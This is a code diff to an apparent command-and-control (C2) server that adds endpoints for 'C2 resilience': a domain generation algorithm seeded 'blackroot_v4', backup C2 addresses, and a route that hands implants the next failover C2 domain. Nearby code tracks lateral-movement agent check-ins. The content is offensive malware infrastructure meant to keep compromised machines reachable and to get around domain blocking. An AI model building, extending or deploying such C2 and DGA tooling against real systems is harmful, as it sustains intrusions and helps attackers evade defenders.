@@ -629,6 +629,45 @@ async def get_agent_checkins():
     return {"total": len(_lateral_checkins), "checkins": list(_lateral_checkins.values())}
 
 # ============================================================================
+# C2 RESILIENCE & DGA RESOLUTION ENDPOINTS (S5)
+# ============================================================================
+
+_resilience_orchestrator = None
+
+def _get_resilience_orchestrator():
+    global _resilience_orchestrator
+    if _resilience_orchestrator is None:
+        try:
+            from c2_dga_generator import DGAGenerator
+            from c2_resilience_orchestrator import C2ResilienceOrchestrator
+            dga = DGAGenerator(seed=os.environ.get("DGA_SEED", "blackroot_v4"))
+            _resilience_orchestrator = C2ResilienceOrchestrator(
+                primary_c2="http://127.0.0.1:8000",
+                backup_ips=["127.0.0.1", "10.0.0.1"],
+                dga_generator=dga
+            )
+        except Exception as e:
+            logger.debug("C2 resilience initialization fallback: %s", e)
+    return _resilience_orchestrator
+
+@app.get("/c2/resilience/status")
+async def get_resilience_status():
+    """Return status of C2 resilience orchestrator, DGA domain pool, and offline queue."""
+    orch = _get_resilience_orchestrator()
+    if orch:
+        return orch.get_status()
+    return {"status": "degraded", "dga_active": False, "offline_queue_size": 0}
+
+@app.get("/c2/resilience/next_domain")
+async def get_next_c2_domain():
+    """Get the next active C2 endpoint / DGA failover domain."""
+    orch = _get_resilience_orchestrator()
+    if orch:
+        c2 = orch.get_next_c2()
+        return {"c2_endpoint": c2, "mode": "dynamic_dga"}
+    return {"c2_endpoint": "http://127.0.0.1:8000", "mode": "fallback_primary"}
+
+# ============================================================================
 # ROOT ENDPOINT
 # ============================================================================
 
